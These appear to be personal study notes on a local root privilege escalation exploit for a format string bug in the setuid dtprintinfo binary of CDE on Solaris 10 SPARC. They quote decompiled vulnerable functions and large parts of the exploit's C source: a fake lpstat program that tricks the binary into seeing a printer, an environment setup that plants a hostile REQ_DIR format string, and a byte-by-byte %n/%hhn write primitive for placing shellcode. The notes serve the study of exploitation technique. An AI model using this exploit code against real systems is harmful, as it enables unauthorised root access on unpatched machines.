---
tags:
  - Article
---
- CDE is common desktop environment 
	- is still being distributed with the latest Solaris 10 version (at least till 2024)
- targets a format string bug in the `dtprintinfo setuid` binary distributed with CDE, in order to achieve local root privilege escalation on unpatched Solaris 10 systems
	- affects both Intel and SPARC architectures
	- this article focuses of SPARC
## The Bug
- the bug is in the `check_dir()` function
```
void __0FJcheck_dirPcTBPPP6QStatusLineStructPii(char *param_1, 
  undefined4 param_2, void **param_3, int *param_4, int param_5)
{
	...
  	char *pcVar3;
	...
  	char local_724 [300];
  	char local_5f8 [300];
	...
  	size_t local_c;
	...
  
  	pcVar3 = getenv("REQ_DIR");
  	if (pcVar3 == (char *)0x0) {
    		sprintf(local_724, "/usr/spool/lp/requests/%s/", param_2);
  	} else {
    		pcVar3 = getenv("REQ_DIR");
    		sprintf(local_724, pcVar3, param_2); /* VULN */
  	}
  	local_c = strlen(local_724);
  	sprintf(local_5f8, "/var/spool/lp/tmp/%s/", param_2);
	...
}
```
- bug is a stack-based buffer overflow and a format string bug
	- on the VULN line the value associated with the environment variable `REQ_DIR` is directly passed as the second parameter to `sprintf()`
	- by manipulating this variable a local attacker is easily able to control the format string used by `sprintf()`
	- a user-supplied format string in a `setuid` root program means bad things
- the other `sprintf()` related buffer also overflows
## The Exploit
### SPARC Stack Layout Woes
- stack-based buffer overflow
	- cant overwrite the saved return address of the current functuion
	- only able to overwrite the saved return address of the caller of the current function
	- in practice, means that the vulnerable program needs to survive an additional function before we can hijack %pc
	- difficult on the SPARC so exploit the format string bug instead
### Fake Printer Setup
- target is the CDE printer viewer
	- "The Print Viewer program provides a graphical interface that displays the status of print queues and print jobs. Additional information about print queues or print jobs can be retrieved within the interface, individual print queue labels and icons can be customised, and individual print jobs can be canceled."
- call tree
![[Screenshot 2025-09-29 at 13.38.58.png|400]]
- `check_dir()` gets called by the `LocalPrintJobs()` function. Used by `Queue::ProcessJobs()` to get the list of local print jobs
	- `LocalPrintJobs()` enters the directory specified by the `TMP_DIR` environment variable and calls the `check_dir()` function for each subdirectory that is present
```
/* open TMP_DIR */
pcVar4 = getenv("TMP_DIR");
if (pcVar4 == (char *)0x0) {
	chdir("/usr/spool/lp/tmp");
} else {
	pcVar4 = getenv("TMP_DIR");
	chdir(pcVar4);
}
__dirp = opendir(".");
...

/* check each subdirectory in TMP_DIR */
pdVar6 = readdir64(__dirp);
if (pdVar6 != (dirent64 *)0x0) {
	uVar2 = pdVar6->d_type;
	while (true) {
		__file = &pdVar6->d_type;
		if (((uVar2 != '.') && (iVar7 = stat64((char *)__file,
		  &sStack456), -1 < iVar7)) && ((sStack456.st_uid & 0x4000)
		    != 0)) {
       			chdir((char *)__file);
			__0FJcheck_dirPcTBPPP6QStatusLineStructPii(param_1,
			  __file, &DAT_00065db0, &local_4, DAT_00065db4);
         		chdir("..");
        	}
```
- to enter this path, wee must be able to double click on a configured printer in the `dtprintinfo` GUI, means 
	- we must have a valid X11 server that accepts connections from the remote vulnerable `dtprintinfo` program, so that we are able to interact with the GUI
	- a configured printer must be present in the GUI so that we can double click on it
- first bit of exploit
```c
int main(int argc, char **argv)
{
	...

	/* lpstat code to add a fake printer */
	if (!strcmp(argv[0], "lpstat")) {

		/* check command line */
		if (argc != 2)
			exit(1);

		/* print the expected output and exit */
		if(!strcmp(argv[1], "-v")) {
			fprintf(stderr, "lpstat called with -v\n");
			printf("device for fnord: /dev/null\n");
		} else {
			fprintf(stderr, "lpstat called with -d\n");
			printf("system default destination: fnord\n");
		}
		exit(0);
	}

	...
	add_env("PATH=.:/usr/bin");
	...

	/* create a symlink for the fake lpstat */
	unlink("lpstat");
	symlink(argv[0], "lpstat");
```
- code fakes the presence of a printer connected to the system by exploiting one of the venerable bugs 
	- allows local unprivileged users to trick `dtprintinfo` into believing that a printer is present by creating a fake `lpstat` program and manipulating the PATH environment variable
	- do not need to do this if your target system already has a configured printer
### Environment Setup
- parse command line arguments and setup the environment before running the vulnerable program 
```c
/* process command line */
	if (argc < 2) {
		fprintf(stderr, 
		  "usage:\n$ %s xserver:display [retloc]\n$ /bin/ksh\n\n",
		    argv[0]);
		exit(1);
	}
	sprintf(display, "DISPLAY=%s", argv[1]);
	if (argc > 2)
		retloc = (int)strtoul(argv[2], (char **)NULL, 0);

	/* evil env var: name + shellcode + padding */
	bzero(buf, sizeof(buf));
	memcpy(buf, "REQ_DIR=", strlen("REQ_DIR="));
	p += strlen("REQ_DIR=");

	/* padding buffer to avoid stack overflow */
	memset(buf2, 'B', sizeof(buf2));
	buf2[sizeof(buf2) - 1] = 0x0;

	/* fill the envp, keeping padding */
	add_env(buf2);
	add_env(buf);
	add_env(display);
	add_env("TMP_DIR=/tmp/just"); /* we must control this empty dir */
	add_env("PATH=.:/usr/bin");
	add_env("HOME=/tmp");
	add_env(NULL);
```
- note
	- as previously discussed, the `REQ_DIR` environment variable contains the hostile format string that triggers the bug
	- the `TMP_DIR` environment variable must point to a path in which we can create a directory
	- `buf2` buffer serves as padding so that `sprintf()` has enough memory space and doesn't crash trying to reach past the bottom of the stack while processing our hostile format string
### Write4 Primitive
- in order to convert our memory corruption into a nice weird machine and hijack the program flow, we must be able to leverage the format string bug to write arbitrary bytes at arbitrary locations in memory
	- one technique involves single-byte writes via the %n formatting directive
- plan to exploit the `sprintf()` in the else statement to replace the `strlen()` with a `strdup()` and the `sprintf()` after will call to the shellcode dynamically allocated in the heap by `strdup()` and pointed to by the `local_c` variable
- cannot use same technique as on Intel where you would abuse the %n formatting directive
- cannot use half-word writes via the %hn formatting directive, this causes large amount of bytes to be written as a side-effect may run out of space
- solution: preform single-byte writes on SPARC, using %hhn formatting directive
```c
/* format string: retloc */
	for (i = retloc; i - retloc < strlen(sc); i += 4) {
		check_zero(i, "ret location");
		*((void **)p) = (void *)(i); p += 4; 	 /* 0x000000ff */
		memset(p, 'A', 4); p += 4; 		 /* dummy      */
		*((void **)p) = (void *)(i); p += 4; 	 /* 0x00ff0000 */
		memset(p, 'A', 4); p += 4; 		 /* dummy      */
		*((void **)p) = (void *)(i); p += 4; 	 /* 0xff000000 */
		memset(p, 'A', 4); p += 4; 		 /* dummy      */
		*((void **)p) = (void *)(i + 2); p += 4; /* 0x0000ff00 */
		memset(p, 'A', 4); p += 4; 		 /* dummy      */
	}

	/* format string: stackpop sequence */
	base = p - buf - strlen("REQ_DIR=");
	for (i = 0; i < stackpops; i++, p += strlen(STACKPOPSEQ), 
	  base += 8)
		memcpy(p, STACKPOPSEQ, strlen(STACKPOPSEQ));

	/* calculate numeric arguments */
	for (i = 0; i < strlen(sc); i += 4)
		CALCARGS(n[i], n[i + 1], n[i + 2], n[i + 3], sc[i], 
		  sc[i + 1], sc[i + 2], sc[i + 3], base);
	
	/* check for potentially dangerous numeric arguments below 10 */
	for (i = 0; i < strlen(sc); i++)
		n[i] += (n[i] < 10) ? (0x100) : (0);

	/* format string: write string */
	for (i = 0; i < strlen(sc); i += 4)
		p += sprintf(p, 
		  "%%.%dx%%n%%.%dx%%hn%%.%dx%%hhn%%.%dx%%hhn", 
	 	    n[i], n[i + 1], n[i + 2], n[i + 3]);
```
- we overwrite one byte at a time at the target address as follows
	1. using the %n formatting directive on `retloc`, we overwrite the LSB
	2. using the %hn formatting directive on `retloc`, we overwrite the byte located at position 0x00ff0000
	3. using %hhn formatting directive on `retloc` we overwrite the MSB
	4. finally, using %hhn formatting directive on `retloc + 2` we overwrite the byte located at position 0x0000ff00